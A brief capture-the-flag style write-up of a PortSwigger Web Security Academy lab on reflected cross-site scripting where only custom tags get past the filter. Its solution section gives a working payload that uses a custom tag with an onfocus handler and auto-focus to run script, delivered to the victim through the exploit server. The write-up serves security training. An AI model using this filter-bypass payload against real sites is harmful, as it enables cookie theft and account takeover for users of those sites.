# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/64f42d85-2e30-4cc4-81ef-b132d980725b)

## Solution

Go to exploit server and in body section give
`<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>`
Then click to **Deliver exploit to victim** to finish the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/02e36874-bd14-4bb8-a59d-b5ded10873d5)
